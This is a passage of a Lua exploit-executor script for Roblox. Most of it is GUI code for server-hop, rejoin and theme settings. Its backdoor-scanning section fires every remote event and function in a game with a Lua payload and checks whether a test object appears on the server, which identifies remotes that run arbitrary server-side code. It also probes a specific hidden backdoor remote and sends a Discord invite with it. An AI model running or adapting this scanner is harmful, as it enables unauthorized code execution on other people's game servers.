box["change fps cap textbox"].Text = ""
box["change fps cap textbox"].PlaceholderText = "enter value here"
box["change fps cap textbox"].PlaceholderColor3 = box["default 1/2 color"]
box["change fps cap textbox"].TextXAlignment = Enum.TextXAlignment.Center
box["change fps cap textbox"].TextYAlignment = Enum.TextYAlignment.Center
box["change fps cap textbox"].BackgroundColor3 = box["default background color"]
box["change fps cap textbox"].BorderColor3 = box["default border color"]
box["change fps cap textbox"].BorderSizePixel = 1
box["change fps cap textbox"].Parent = box["server settings holder"]
box["change fps cap textbox"].ZIndex = 24

box["change fps cap setting"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	local fpscap = tonumber(box["change fps cap textbox"].Text)
	if fpscap and fpscap ~= "" then
		fpscap = math.clamp(fpscap, 1, 240)
		box["change fps cap"].Text = "fps cap: " .. fpscap
	end
	box["change fps cap textbox"].Text = ""
end)

-------------------------------------------------------------------------------------------------------------------------------

box["rejoin server"].Size = UDim2.new(0, 128, 0, 68)
box["rejoin server"].Position = UDim2.new(0, 0, 0, 73)
box["rejoin server"].TextColor3 = box["default border color"]
box["rejoin server"].Font = Enum.Font.RobotoMono
box["rejoin server"].TextScaled = false
box["rejoin server"].TextSize = 15
box["rejoin server"].Text = "rejoin server"
box["rejoin server"].TextXAlignment = Enum.TextXAlignment.Center
box["rejoin server"].TextYAlignment = Enum.TextYAlignment.Center
box["rejoin server"].BackgroundColor3 = box["default background color"]
box["rejoin server"].BorderColor3 = box["default border color"]
box["rejoin server"].BorderSizePixel = 1
box["rejoin server"].Parent = box["server settings holder"]
box["rejoin server"].ZIndex = 24

box["rejoin server"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	if #box["players"]:GetPlayers() <= 1 then
		box["players"].LocalPlayer:Kick("rejoining -.-")
		wait()
		box["teleport service"]:Teleport(getPlaceId(), box["players"].LocalPlayer)
	else
		box["teleport service"]:TeleportToPlaceInstance(getPlaceId(), getJobId(), box["players"].LocalPlayer)
	end
end)

box["leave game"].Size = UDim2.new(0, 127, 0, 68)
box["leave game"].Position = UDim2.new(0, 133, 0, 73)
box["leave game"].TextColor3 = box["default border color"]
box["leave game"].Font = Enum.Font.RobotoMono
box["leave game"].TextScaled = false
box["leave game"].TextSize = 15
box["leave game"].Text = "leave game"
box["leave game"].TextXAlignment = Enum.TextXAlignment.Center
box["leave game"].TextYAlignment = Enum.TextYAlignment.Center
box["leave game"].BackgroundColor3 = box["default background color"]
box["leave game"].BorderColor3 = box["default border color"]
box["leave game"].BorderSizePixel = 1
box["leave game"].Parent = box["server settings holder"]
box["leave game"].ZIndex = 24

box["leave game"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	game:Shutdown()
end)

box["server hop"].Size = UDim2.new(0, 128, 0, 68)
box["server hop"].Position = UDim2.new(0, 265, 0, 73)
box["server hop"].TextColor3 = box["default border color"]
box["server hop"].Font = Enum.Font.RobotoMono
box["server hop"].TextScaled = false
box["server hop"].TextSize = 15
box["server hop"].Text = "server hop"
box["server hop"].TextXAlignment = Enum.TextXAlignment.Center
box["server hop"].TextYAlignment = Enum.TextYAlignment.Center
box["server hop"].BackgroundColor3 = box["default background color"]
box["server hop"].BorderColor3 = box["default border color"]
box["server hop"].BorderSizePixel = 1
box["server hop"].Parent = box["server settings holder"]
box["server hop"].ZIndex = 24

box["server hop"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	if httprequest then
		local servers = {}
		local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", getPlaceId())})
		local body = HttpService:JSONDecode(req.Body)

		if body and body.data then
			for i, v in next, body.data do
				if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
					table.insert(servers, 1, v.id)
				end
			end
		end

		if #servers > 0 then
			box["teleport service"]:TeleportToPlaceInstance(getPlaceId(), servers[math.random(1, #servers)], box["players"].LocalPlayer)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

box["auto rejoin toggle"].Size = UDim2.new(0, 230, 0, 68)
box["auto rejoin toggle"].Position = UDim2.new(0, 0, 0, 146)
box["auto rejoin toggle"].TextColor3 = box["default border color"]
box["auto rejoin toggle"].Font = Enum.Font.RobotoMono
box["auto rejoin toggle"].TextScaled = false
box["auto rejoin toggle"].TextSize = 15
box["auto rejoin toggle"].Text = "auto rejoin: disabled"
box["auto rejoin toggle"].TextXAlignment = Enum.TextXAlignment.Center
box["auto rejoin toggle"].TextYAlignment = Enum.TextYAlignment.Center
box["auto rejoin toggle"].BackgroundColor3 = box["default background color"]
box["auto rejoin toggle"].BorderColor3 = box["default border color"]
box["auto rejoin toggle"].BorderSizePixel = 1
box["auto rejoin toggle"].Parent = box["server settings holder"]
box["auto rejoin toggle"].ZIndex = 24

box["toggle auto rejoin on"].Size = UDim2.new(0, 158, 0, 31)
box["toggle auto rejoin on"].Position = UDim2.new(0, 235, 0, 146)
box["toggle auto rejoin on"].TextColor3 = box["default border color"]
box["toggle auto rejoin on"].Font = Enum.Font.RobotoMono
box["toggle auto rejoin on"].TextScaled = false
box["toggle auto rejoin on"].TextSize = 15
box["toggle auto rejoin on"].Text = "enable"
box["toggle auto rejoin on"].TextXAlignment = Enum.TextXAlignment.Center
box["toggle auto rejoin on"].TextYAlignment = Enum.TextYAlignment.Center
box["toggle auto rejoin on"].BackgroundColor3 = box["default background color"]
box["toggle auto rejoin on"].BorderColor3 = box["default border color"]
box["toggle auto rejoin on"].BorderSizePixel = 1
box["toggle auto rejoin on"].Parent = box["server settings holder"]
box["toggle auto rejoin on"].ZIndex = 24

box["toggle auto rejoin off"].Size = UDim2.new(0, 158, 0, 32)
box["toggle auto rejoin off"].Position = UDim2.new(0, 235, 0, 182)
box["toggle auto rejoin off"].TextColor3 = box["default border color"]
box["toggle auto rejoin off"].Font = Enum.Font.RobotoMono
box["toggle auto rejoin off"].TextScaled = false
box["toggle auto rejoin off"].TextSize = 15
box["toggle auto rejoin off"].Text = "disable"
box["toggle auto rejoin off"].TextXAlignment = Enum.TextXAlignment.Center
box["toggle auto rejoin off"].TextYAlignment = Enum.TextYAlignment.Center
box["toggle auto rejoin off"].BackgroundColor3 = box["default background color"]
box["toggle auto rejoin off"].BorderColor3 = box["default border color"]
box["toggle auto rejoin off"].BorderSizePixel = 1
box["toggle auto rejoin off"].Parent = box["server settings holder"]
box["toggle auto rejoin off"].ZIndex = 24

arj = false

box["toggle auto rejoin on"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	box["auto rejoin toggle"].Text = "auto rejoin: enabled"
	arj = true
end)

box["toggle auto rejoin off"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	box["auto rejoin toggle"].Text = "auto rejoin: disabled"
	arj = false
end)

if game.PlaceId ~= box["test game"] then
	box["gui service"].ErrorMessageChanged:Connect(function()
		if arj == false then return end
		box["gui service"].ErrorMessageChanged:Connect(function()
			rejoin()
		end)
	end)
end

-------------------------------------------------------------------------------------------------------------------------------

box["script settings holder"].Size = UDim2.new(0, 393, 0, 214)
box["script settings holder"].Position = UDim2.new(0, 4, 0, 31)
box["script settings holder"].BackgroundColor3 = box["default background color"]
box["script settings holder"].BorderColor3 = box["default border color"]
box["script settings holder"].BorderSizePixel = 0
box["script settings holder"].Parent = box["main frame 3"]
box["script settings holder"].Visible = true
box["script settings holder"].ZIndex = 23

-------------------------------------------------------------------------------------------------------------------------------

box["current theme"].Size = UDim2.new(0, 230, 0, 68)
box["current theme"].Position = UDim2.new(0, 0, 0, 0)
box["current theme"].TextColor3 = box["default border color"]
box["current theme"].Font = Enum.Font.RobotoMono
box["current theme"].TextScaled = false
box["current theme"].TextSize = 15
box["current theme"].Text = "current theme: default"
box["current theme"].TextXAlignment = Enum.TextXAlignment.Center
box["current theme"].TextYAlignment = Enum.TextYAlignment.Center
box["current theme"].BackgroundColor3 = box["default background color"]
box["current theme"].BorderColor3 = box["default border color"]
box["current theme"].BorderSizePixel = 1
box["current theme"].Parent = box["script settings holder"]
box["current theme"].ZIndex = 24

box["change theme setting"].Size = UDim2.new(0, 158, 0, 68)
box["change theme setting"].Position = UDim2.new(0, 235, 0, 0)
box["change theme setting"].TextColor3 = box["default border color"]
box["change theme setting"].Font = Enum.Font.RobotoMono
box["change theme setting"].TextScaled = false
box["change theme setting"].TextSize = 15
box["change theme setting"].Text = "change theme"
box["change theme setting"].TextXAlignment = Enum.TextXAlignment.Center
box["change theme setting"].TextYAlignment = Enum.TextYAlignment.Center
box["change theme setting"].BackgroundColor3 = box["default background color"]
box["change theme setting"].BorderColor3 = box["default border color"]
box["change theme setting"].BorderSizePixel = 1
box["change theme setting"].Parent = box["script settings holder"]
box["change theme setting"].ZIndex = 24

local currenttheme = "boxten sex"
local themes = {
	"boxten sex",
	"default",
	"grayscale",
	"noxious",
	"c00l",
	"polaria",
}

function updthemedisplay()
	box["current theme"].Text = "current theme: " .. currenttheme
end

function applytheme(themeName)

	grayscaletheme = false
	noxioustheme = false
	c00ltheme = false
	defaulttheme = false
	polariatheme = false
	bstheme = false

	if themeName == "default" then
		defaulttheme = true
		grayscaletheme = false
		noxioustheme = false
		c00ltheme = false
		polariatheme = false
		bstheme = false
		task.wait(0.1)
		defaultcols()
	elseif themeName == "grayscale" then
		grayscaletheme = true
		noxioustheme = false
		c00ltheme = false
		defaulttheme = false
		polariatheme = false
		bstheme = false
		grayscalecols()
	elseif themeName == "noxious" then
		noxioustheme = true
		grayscaletheme = false
		c00ltheme = false
		defaulttheme = false
		polariatheme = false
		bstheme = false
		noxiouscols()
	elseif themeName == "c00l" then
		c00ltheme = true
		grayscaletheme = false
		noxioustheme = false
		defaulttheme = false
		polariatheme = false
		bstheme = false
		c00lcols()
	elseif themeName == "polaria" then
		polariatheme = true
		grayscaletheme = false
		noxioustheme = false
		c00ltheme = false
		defaulttheme = false
		bstheme = false
		polariacols()
	elseif themeName == "boxten sex" then
		grayscaletheme = false
		noxioustheme = false
		c00ltheme = false
		defaulttheme = false
		bstheme = true
		polariatheme = false
		restorecols()
	end

	currenttheme = themeName
	updthemedisplay()
	updcols()
end

function cycleTheme()
	local currentind = 1
	for i, theme in ipairs(themes) do
		if theme == currenttheme then
			currentind = i
			break
		end
	end

	local nextind = currentind % #themes + 1
	applytheme(themes[nextind])
end

box["change theme setting"].MouseButton1Click:Connect(function()
	if playclicksound then
		playclicksound()
	end
	cycleTheme()
end)

updthemedisplay()

-------------------------------------------------------------------------------------------------------------------------------

box["command prefix"].Size = UDim2.new(0, 230, 0, 68)
box["command prefix"].Position = UDim2.new(0, 0, 0, 73)
box["command prefix"].TextColor3 = box["default border color"]
box["command prefix"].Font = Enum.Font.RobotoMono
box["command prefix"].TextScaled = false
box["command prefix"].TextSize = 15
box["command prefix"].Text = "command prefix: ."
box["command prefix"].TextXAlignment = Enum.TextXAlignment.Center
box["command prefix"].TextYAlignment = Enum.TextYAlignment.Center
box["command prefix"].BackgroundColor3 = box["default background color"]
box["command prefix"].BorderColor3 = box["default border color"]
box["command prefix"].BorderSizePixel = 1
box["command prefix"].Parent = box["script settings holder"]
box["command prefix"].ZIndex = 24

box["change command prefix setting"].Size = UDim2.new(0, 158, 0, 31)
box["change command prefix setting"].Position = UDim2.new(0, 235, 0, 73)
box["change command prefix setting"].TextColor3 = box["default border color"]
box["change command prefix setting"].Font = Enum.Font.RobotoMono
box["change command prefix setting"].TextScaled = false
box["change command prefix setting"].TextSize = 15
box["change command prefix setting"].Text = "change prefix"
box["change command prefix setting"].TextXAlignment = Enum.TextXAlignment.Center
box["change command prefix setting"].TextYAlignment = Enum.TextYAlignment.Center
box["change command prefix setting"].BackgroundColor3 = box["default background color"]
box["change command prefix setting"].BorderColor3 = box["default border color"]
box["change command prefix setting"].BorderSizePixel = 1
box["change command prefix setting"].Parent = box["script settings holder"]
box["change command prefix setting"].ZIndex = 24

box["change command prefix setting"].MouseButton1Click:Connect(function()
	playclicksound()
	local nooprefix = box["change command prefix textbox"].Text
	box["change command prefix textbox"].Text = ""
	changeprefix(nooprefix)
end)

box["change command prefix textbox"].Size = UDim2.new(0, 158, 0, 32)
box["change command prefix textbox"].Position = UDim2.new(0, 235, 0, 109)
box["change command prefix textbox"].TextColor3 = box["default border color"]
box["change command prefix textbox"].Font = Enum.Font.RobotoMono
box["change command prefix textbox"].TextScaled = false
box["change command prefix textbox"].TextSize = 15
box["change command prefix textbox"].Text = ""
box["change command prefix textbox"].PlaceholderText = "enter prefix here"
box["change command prefix textbox"].PlaceholderColor3 = box["default 1/2 color"]
box["change command prefix textbox"].TextXAlignment = Enum.TextXAlignment.Center
box["change command prefix textbox"].TextYAlignment = Enum.TextYAlignment.Center
box["change command prefix textbox"].BackgroundColor3 = box["default background color"]
box["change command prefix textbox"].BorderColor3 = box["default border color"]
box["change command prefix textbox"].BorderSizePixel = 1
box["change command prefix textbox"].Parent = box["script settings holder"]
box["change command prefix textbox"].ZIndex = 24

-------------------------------------------------------------------------------------------------------------------------------

box["change click sound setting"].Size = UDim2.new(0, 230, 0, 68)
box["change click sound setting"].Position = UDim2.new(0, 0, 0, 146)
box["change click sound setting"].TextColor3 = box["default border color"]
box["change click sound setting"].Font = Enum.Font.RobotoMono
box["change click sound setting"].TextScaled = false
box["change click sound setting"].TextSize = 15
box["change click sound setting"].Text = "click sound: 226892749"
box["change click sound setting"].TextXAlignment = Enum.TextXAlignment.Center
box["change click sound setting"].TextYAlignment = Enum.TextYAlignment.Center
box["change click sound setting"].BackgroundColor3 = box["default background color"]
box["change click sound setting"].BorderColor3 = box["default border color"]
box["change click sound setting"].BorderSizePixel = 1
box["change click sound setting"].Parent = box["script settings holder"]
box["change click sound setting"].ZIndex = 24

box["change click sound"].Size = UDim2.new(0, 158, 0, 31)
box["change click sound"].Position = UDim2.new(0, 235, 0, 146)
box["change click sound"].TextColor3 = box["default border color"]
box["change click sound"].Font = Enum.Font.RobotoMono
box["change click sound"].TextScaled = false
box["change click sound"].TextSize = 15
box["change click sound"].Text = "change click sound"
box["change click sound"].TextXAlignment = Enum.TextXAlignment.Center
box["change click sound"].TextYAlignment = Enum.TextYAlignment.Center
box["change click sound"].BackgroundColor3 = box["default background color"]
box["change click sound"].BorderColor3 = box["default border color"]
box["change click sound"].BorderSizePixel = 1
box["change click sound"].Parent = box["script settings holder"]
box["change click sound"].ZIndex = 24

box["change click sound textbox"].Size = UDim2.new(0, 158, 0, 32)
box["change click sound textbox"].Position = UDim2.new(0, 235, 0, 182)
box["change click sound textbox"].TextColor3 = box["default border color"]
box["change click sound textbox"].Font = Enum.Font.RobotoMono
box["change click sound textbox"].TextScaled = false
box["change click sound textbox"].TextSize = 15
box["change click sound textbox"].Text = ""
box["change click sound textbox"].PlaceholderText = "enter sound ID here"
box["change click sound textbox"].PlaceholderColor3 = box["default 1/2 color"]
box["change click sound textbox"].TextXAlignment = Enum.TextXAlignment.Center
box["change click sound textbox"].TextYAlignment = Enum.TextYAlignment.Center
box["change click sound textbox"].BackgroundColor3 = box["default background color"]
box["change click sound textbox"].BorderColor3 = box["default border color"]
box["change click sound textbox"].BorderSizePixel = 1
box["change click sound textbox"].Parent = box["script settings holder"]
box["change click sound textbox"].ZIndex = 24

function updateClickSound(newSoundId)
	if tonumber(newSoundId) then
		box["change click sound setting"].Text = "click sound: " .. newSoundId

		if box["click sound"] and box["click sound"]:IsA("Sound") then
			box["click sound"].SoundId = "rbxassetid://" .. newSoundId
		end

		box["change click sound textbox"].Text = ""
	else
		box["change click sound setting"].Text = "click sound: n/a"
	end
end

box["change click sound"].MouseButton1Click:Connect(function()
	playclicksound()
	local newSoundId = box["change click sound textbox"].Text
	updateClickSound(newSoundId)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["backdoor info"].Size = UDim2.new(0, 133, 0, 26)
box["backdoor info"].Position = UDim2.new(0, 0, 0, 0)

box["backdoor info"].BackgroundColor3 = box["default background color"]

box["backdoor info"].BorderColor3 = box["default border color"]
box["backdoor info"].BorderSizePixel = 1

box["backdoor info"].TextColor3 = box["default border color"]
box["backdoor info"].Font = Enum.Font.RobotoMono
box["backdoor info"].TextSize = 15
box["backdoor info"].TextScaled = false
box["backdoor info"].Text = "backdoor info"
box["backdoor info"].TextXAlignment = Enum.TextXAlignment.Center
box["backdoor info"].TextYAlignment = Enum.TextYAlignment.Center

box["backdoor info text padding"] = Instance.new("UIPadding")
box["backdoor info text padding"].PaddingLeft = UDim.new(0, 0)
box["backdoor info text padding"].Parent = box["scripts tab"]

box["backdoor info"].Parent = box["main frame 4"]
box["backdoor info"].ZIndex = 25

box["backdoor info holder"].Size = UDim2.new(0, 393, 0, 214)
box["backdoor info holder"].Position = UDim2.new(0, 4, 0, 31)
box["backdoor info holder"].BackgroundColor3 = box["default background color"]
box["backdoor info holder"].BorderColor3 = box["default border color"]
box["backdoor info holder"].BorderSizePixel = 1
box["backdoor info holder"].Parent = box["main frame 4"]
box["backdoor info holder"].ZIndex = 19
box["backdoor info holder"].Visible = true
box["backdoor info holder"].TextWrapped = true

box["backdoor info bottom cover"].Name = "bcover"
box["backdoor info bottom cover"].Size = UDim2.new(0, 133, 0, 2)
box["backdoor info bottom cover"].Position = UDim2.new(0, 0, 0, 26)
box["backdoor info bottom cover"].BackgroundColor3 = box["default background color"]
box["backdoor info bottom cover"].BorderSizePixel = 0
box["backdoor info bottom cover"].Parent = box["main frame 4"]
box["backdoor info bottom cover"].ZIndex = 25.5
box["backdoor info bottom cover"].Visible = true

local rfe = "true"

if game:GetService("SoundService").RespectFilteringEnabled == true then
	rfe = "true"
else
	rfe = "false"
end

box["backdoor info holder"].TextColor3 = box["default border color"]
box["backdoor info holder"].Font = Enum.Font.RobotoMono
box["backdoor info holder"].TextSize = 15
box["backdoor info holder"].TextScaled = false
box["backdoor info holder"].Text = "respectfilteringenabled = " .. rfe .. "\nbackdoors found: 0\nbackdoor path: n/a\nmethod used: n/a\nbackdoor level: n/a (none found)\nbackdoor destructivity level: n/a\nbackdoor type: n/a\npgrab availability: n/a\nexecutor identity: 8"
box["backdoor info holder"].TextXAlignment = Enum.TextXAlignment.Left
box["backdoor info holder"].TextYAlignment = Enum.TextYAlignment.Top
box["backdoor info holder"].ZIndex = 25

box["backdoor info holder text padding"] = Instance.new("UIPadding")
box["backdoor info holder text padding"].PaddingLeft = UDim.new(0, 4)
box["backdoor info holder text padding"].PaddingTop = UDim.new(0, 4)
box["backdoor info holder text padding"].PaddingBottom = UDim.new(0, 4)
box["backdoor info holder text padding"].Parent = box["backdoor info holder"]

box["backdoor info"].MouseButton1Click:Connect(function()
	playclicksound()

	box["backdoor info bottom cover"].Visible = true
	box["scanning bottom cover"].Visible = false
	box["credits bottom cover"].Visible = false

	box["backdoor info holder"].Visible = true
	box["logs holder"].Visible = false
	box["logs scrolling frame"].Visible = false
	box["backdoor scan button"].Visible = false
	box["credits holder"].Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

box["scanning"].Size = UDim2.new(0, 133, 0, 26)
box["scanning"].Position = UDim2.new(0, 134, 0, 0)

box["scanning"].BackgroundColor3 = box["default background color"]

box["scanning"].BorderColor3 = box["default border color"]
box["scanning"].BorderSizePixel = 1

box["scanning"].TextColor3 = box["default border color"]
box["scanning"].Font = Enum.Font.RobotoMono
box["scanning"].TextSize = 15
box["scanning"].TextScaled = false
box["scanning"].Text = "backdoor scanning"
box["scanning"].TextXAlignment = Enum.TextXAlignment.Center
box["scanning"].TextYAlignment = Enum.TextYAlignment.Center

box["scanning text padding"] = Instance.new("UIPadding")
box["scanning text padding"].PaddingLeft = UDim.new(0, 0)
box["scanning text padding"].Parent = box["main frame 4"]

box["scanning"].Parent = box["main frame 4"]
box["scanning"].ZIndex = 25

box["scanning bottom cover"].Size = UDim2.new(0, 133, 0, 2)
box["scanning bottom cover"].Position = UDim2.new(0, 134, 0, 26)
box["scanning bottom cover"].BackgroundColor3 = box["default background color"]
box["scanning bottom cover"].BorderSizePixel = 0
box["scanning bottom cover"].Parent = box["main frame 4"]
box["scanning bottom cover"].ZIndex = 25.5
box["scanning bottom cover"].Visible = false

box["scanning"].MouseButton1Click:Connect(function()
	playclicksound()

	box["backdoor info bottom cover"].Visible = false
	box["scanning bottom cover"].Visible = true
	box["credits bottom cover"].Visible = false

	box["backdoor info holder"].Visible = false
	box["logs holder"].Visible = true
	box["logs scrolling frame"].Visible = true
	box["backdoor scan button"].Visible = true
	box["credits holder"].Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

box["logs holder"].Size = UDim2.new(0, 393, 0, 214)
box["logs holder"].Position = UDim2.new(0, 4, 0, 31)
box["logs holder"].BackgroundColor3 = box["default background color"]
box["logs holder"].BorderColor3 = box["default border color"]
box["logs holder"].BorderSizePixel = 0
box["logs holder"].Parent = box["main frame 4"]
box["logs holder"].Visible = false
box["logs holder"].ZIndex = 23

-------------------------------------------------------------------------------------------------------------------------------

box["logs label"].Size = UDim2.new(0, 393, 0, 19)
box["logs label"].Position = UDim2.new(0, 0, 0, 0)
box["logs label"].TextColor3 = box["default border color"]
box["logs label"].Font = Enum.Font.RobotoMono
box["logs label"].TextScaled = false
box["logs label"].TextSize = 15
box["logs label"].Text = "logs"
box["logs label"].TextXAlignment = Enum.TextXAlignment.Center
box["logs label"].TextYAlignment = Enum.TextYAlignment.Center
box["logs label"].BackgroundColor3 = box["default background color"]
box["logs label"].BorderColor3 = box["default border color"]
box["logs label"].BorderSizePixel = 1
box["logs label"].Parent = box["logs holder"]
box["logs label"].ZIndex = 24

box["logs label text padding"] = Instance.new("UIPadding")
box["logs label text padding"].PaddingBottom = UDim.new(0, 1)
box["logs label text padding"].Parent = box["logs label"]

-------------------------------------------------------------------------------------------------------------------------------

box["logs scrolling frame"].Size = UDim2.new(0, 393, 0, 140)
box["logs scrolling frame"].Position = UDim2.new(0, 4, 0, 55)
box["logs scrolling frame"].BackgroundColor3 = box["default background color"]
box["logs scrolling frame"].BorderColor3 = box["default border color"]
box["logs scrolling frame"].BorderSizePixel = 1
box["logs scrolling frame"].ScrollBarThickness = 8
box["logs scrolling frame"].ScrollBarImageColor3 = box["default 1/2 color"]
box["logs scrolling frame"].CanvasSize = UDim2.new(0, 0, 0, 0)
box["logs scrolling frame"].Parent = box["main frame 4"]
box["logs scrolling frame"].ZIndex = 24
box["logs scrolling frame"].Visible = false
box["logs scrolling frame"].ScrollingDirection = Enum.ScrollingDirection.XY

box["logs textbox"].Name = "temphalf"
box["logs textbox"].Size = UDim2.new(0, 393, 0, 164)
box["logs textbox"].Position = UDim2.new(0, 0, 0, 0)
box["logs textbox"].BackgroundColor3 = box["default background color"]
box["logs textbox"].BorderColor3 = box["default border color"]
box["logs textbox"].BorderSizePixel = 0
box["logs textbox"].TextColor3 = box["default border color"]
box["logs textbox"].PlaceholderText = "backdoor scanning logs will appear here"
box["logs textbox"].PlaceholderColor3 = box["default 1/2 color"]
box["logs textbox"].Font = Enum.Font.RobotoMono
box["logs textbox"].TextSize = 15
box["logs textbox"].TextScaled = false
box["logs textbox"].Text = ""
box["logs textbox"].TextXAlignment = Enum.TextXAlignment.Left
box["logs textbox"].TextYAlignment = Enum.TextYAlignment.Top
box["logs textbox"].ClearTextOnFocus = false
box["logs textbox"].MultiLine = true
box["logs textbox"].Parent = box["logs scrolling frame"]
box["logs textbox"].ZIndex = 24
box["logs textbox"].TextEditable = false

box["logs textbox text padding"] = Instance.new("UIPadding")
box["logs textbox text padding"].PaddingLeft = UDim.new(0, 4)
box["logs textbox text padding"].PaddingTop = UDim.new(0, 4)
box["logs textbox text padding"].PaddingBottom = UDim.new(0, 4)
box["logs textbox text padding"].Parent = box["logs scrolling frame"]

local function addTextWithNewline(textBox, text)
	local serverTime = os.date("%X")

	if textBox.Text == "" then
		textBox.Text = "[" .. serverTime .. "] " .. text
	else
		textBox.Text = textBox.Text .. "\n[" .. serverTime .. "] " .. text
	end

	updateCanvas2()
end

function updateCanvas2()
	local textBounds = box["logs textbox"].TextBounds

	box["logs textbox"].Size = UDim2.new(0, math.max(392, textBounds.X + 20), 0, math.max(164, textBounds.Y + 20))
	box["logs scrolling frame"].CanvasSize = UDim2.new(0, textBounds.X + 20, 0, textBounds.Y + 11)

	box["logs scrolling frame"].CanvasPosition = Vector2.new(0, box["logs scrolling frame"].CanvasSize.Y.Offset)
end

box["logs textbox"]:GetPropertyChangedSignal("Text"):Connect(updateCanvas2)

updateCanvas2()

-------------------------------------------------------------------------------------------------------------------------------

local canscan = true

box["backdoor scan button"].Size = UDim2.new(0, 393, 0, 45)
box["backdoor scan button"].Position = UDim2.new(0, 4, 0, 200)

box["backdoor scan button"].BackgroundColor3 = box["default background color"]

box["backdoor scan button"].BorderColor3 = box["default border color"]
box["backdoor scan button"].BorderSizePixel = 1

box["backdoor scan button"].TextColor3 = box["default border color"]
box["backdoor scan button"].Font = Enum.Font.RobotoMono
box["backdoor scan button"].TextSize = 15
box["backdoor scan button"].TextScaled = false
box["backdoor scan button"].Text = "start scanning"
box["backdoor scan button"].TextXAlignment = Enum.TextXAlignment.Center
box["backdoor scan button"].TextYAlignment = Enum.TextYAlignment.Center

box["backdoor scan button text padding"] = Instance.new("UIPadding")
box["backdoor scan button text padding"].PaddingLeft = UDim.new(0, 0)
box["backdoor scan button text padding"].Parent = box["backdoor scan button"]

box["backdoor scan button"].Parent = box["main frame 4"]
box["backdoor scan button"].ZIndex = 24
box["backdoor scan button"].Visible = false

backdoor=nil
hasscanned = false
scanning = false

box["backdoor scan button"].MouseButton1Click:Connect(function()
	scanning = true
	playclicksound()
	if canscan == false then return end
	canscan = false
	spawn(function() box["startup"]:Play(); toggleLoop(false); box["toggle interface visibility button"].Text = "-.-" end)
	spawn(function()
		local checkingforbackdoors = true

		alphabet={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

		HttpService=game:GetService("HttpService")

		function debug(text, lvl)
			local func=print
			if lvl==1 then func=print end
			if lvl==2 then func=error end
			if lvl==3 then func=warn end
			func("[uwusploit>.<]: "..text)
		end

		function runbackdoor(remote, data, data2)

			if not remote then return end

			if remote:IsA('RemoteEvent') then
				remote:FireServer(data)
			elseif remote:IsA('RemoteFunction') then
				spawn(function() remote:InvokeServer(data) end)
			end

		end

		function generateName(lenght)

			local text=''

			for i=1,lenght do
				text=text..alphabet[math.random(1,#alphabet)]
			end

			return text

		end

		local code
		function findRemote()
			local timee = os.clock()
			local remotes = {}
			local backdoorPath = "n/a"

			local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
			if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
				while true do
					code = generateName(math.random(12,30))
					if not remotes[code] then break end
				end
				spawn(function() protected_backdoor:InvokeServer('join team noxious later maybe idk | gg/bwdk8vAy8n', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
				remotes[code] = protected_backdoor
			end

			for i, remote in pairs(game:GetDescendants()) do
				local skip = false

				if string.find(remote.Name, "TutorialTower") then
					addTextWithNewline(box["logs textbox"], 'skipped remote: ' .. remote.Name)
					skip = true
				end

				if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then
					skip = true
				end

				if not skip and string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
					addTextWithNewline(box["logs textbox"], 'replicated storage remote found: ' .. remote.Name)
					skip = true
				end

				if not skip and (remote.Parent == game:GetService("ReplicatedStorage")
					or remote.Parent.Parent == game:GetService("ReplicatedStorage")
					or remote.Parent.Parent.Parent == game:GetService("ReplicatedStorage")) then

					if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
						addTextWithNewline(box["logs textbox"], 'adonis filter detected: ' .. remote.Name)
						skip = true
					end

					if not skip and remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
						addTextWithNewline(box["logs textbox"], 'hd admin detected: ' .. remote.Name)
						skip = true
					end

					if not skip and remote.Parent.Name == 'DefaultChatSystemChatEvents' then
						addTextWithNewline(box["logs textbox"], 'chat event detected: ' .. remote.Name)
						skip = true
					end
				end

				if not skip then
					while true do
						code = generateName(math.random(12, 30))
						if not remotes[code] then break end
					end

					runbackdoor(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
					remotes[code] = remote
					addTextWithNewline(box["logs textbox"], "sent backdoor: " .. remote:GetFullName())
					wait(0)
				end
			end

			for i = 1, 100 do
				for code, remote in pairs(remotes) do
					if workspace:FindFirstChild(code) then
						backdoorPath = remote:GetFullName()

						box["backdoor info holder"].Text = string.format(
							"respectfilteringenabled = " .. rfe .. "\nbackdoors found: 1\nbackdoor path: %s\nmethod used: remote scan\nbackdoor level: 6.000000033 (only affects server)\nbackdoor destructivity level: n/a\nbackdoor type: n/a\npgrab availability: n/a\nexecutor identity: 8",
							backdoorPath
						)

						checkingforbackdoors = false
						box["toggle interface visibility button"].Text = "^.^"

						local yay = Instance.new("Sound")
						yay.SoundId = "rbxassetid://8458409341"
						yay.Parent = box["local player"]
						yay.Name = "canttouchthis"
						yay.Volume = 1
						spawn(function() yay:Play() end)
						unablenotify("backdoor found. (" .. backdoorPath .. ")")
						task.spawn(updcols)

						box["backdoor scan button"].Visible = false
						box["backdoor test button"] = Instance.new("TextButton")

						box["backdoor test button"].Size = UDim2.new(0, 393, 0, 45)
						box["backdoor test button"].Position = UDim2.new(0, 4, 0, 200)

						box["backdoor test button"].BackgroundColor3 = box["default background color"]

						box["backdoor test button"].BorderColor3 = box["default border color"]
						box["backdoor test button"].BorderSizePixel = 1
